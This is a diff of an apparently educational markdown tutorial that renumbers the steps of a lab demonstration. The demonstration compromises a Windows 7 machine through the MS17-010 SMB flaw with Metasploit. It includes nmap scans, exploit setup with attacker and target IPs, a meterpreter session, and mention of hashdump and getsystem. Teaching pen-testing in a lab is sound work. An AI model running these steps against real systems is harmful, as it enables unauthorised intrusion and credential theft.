@@ -56,7 +56,7 @@ style F fill:orange,color:black,stroke-width:1px
  - Armitage
 
 
-**\#NOTE:** In case you are using any pen-testing OS like [Kali Linux](https://www.kali.org/) or [Parrot Security](https://www.parrotsec.org/), Metasploit  framework comes pre-installed with Msfconsole in them. 
+**NOTE:** In case you are using any pen-testing OS like [Kali Linux](https://www.kali.org/) or [Parrot Security](https://www.parrotsec.org/), Metasploit  framework comes pre-installed with Msfconsole in them. 
 
 
 ## Penetrating Windows 7 Machine?
@@ -71,14 +71,15 @@ style F fill:orange,color:black,stroke-width:1px
  - The firewall of the windows is already disabled in this demonstration
  - The Attacker and Target machine is connected over the save network. i.e., they are in same subnet.  
 
-### In Attacker's Machine:
-<hr>
-Open msfconsole
+**NOTE: All steps written below will be performed in the atacker's machine**
+
+**Step 1: Open msfconsole**
+
 ```bash
 sudo msfconsole
 ```
 
-**Finding the Target's IP**
+**Step 2: Finding the Target's IP**
 
 Find your eth0 IP address, to identify subnet to scan, because as the target machine is connected with the same router, it must be in the same subnet as well.
 ```bash
@@ -99,7 +100,7 @@ msf> nmap -O 192.168.126.0/24
 We found the IP address of the target machine.
 Target IP: 192.168.126.132
 
-**Finding Vulnerability in Target Machine**
+**Step 3: Finding Vulnerability in Target Machine**
 
 Checking if the current version of OS the target machine is running on is having any publicly known vulnerability. This can be achieved by nmap script scan.
 ```bash
@@ -109,7 +110,7 @@ msf> nmap --script="vuln" 192.168.126.132
 
 We identified that the target's machine is vulnerable for remote code execution, by the exploit smb-vuln-ms17-010. more details could be gathered from [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143).
 
-**Finding and Setting up the Exploit**
+**Step 4: Finding and Setting up the Exploit**
 
 search is there is any exploit module available to exploit the Windows's SMB vulnerability ms17-101.
 
@@ -145,7 +146,7 @@ msf> set RHOST 192.168.126.132
 msf> set LHOST 192.168.126.128
 msf> set LPORT 4444
 ```
-**Exploiting to Gain Access**
+**Step 5: Exploiting to Gain Access**
 
 After setting up the environment just type exploit or run to execute the payload.
 ```bash
@@ -161,7 +162,7 @@ meterpreter> pwd
 
 ![success 1 result](https://github.com/000Sushant/metasploit_docs/blob/main/success1.png)
 
-**Post Exploitation Steps**
+**Step 6: Post Exploitation Steps**
 commands like hashdump and getsystem could be used to perform privilege escalation. 
 
 ```bash
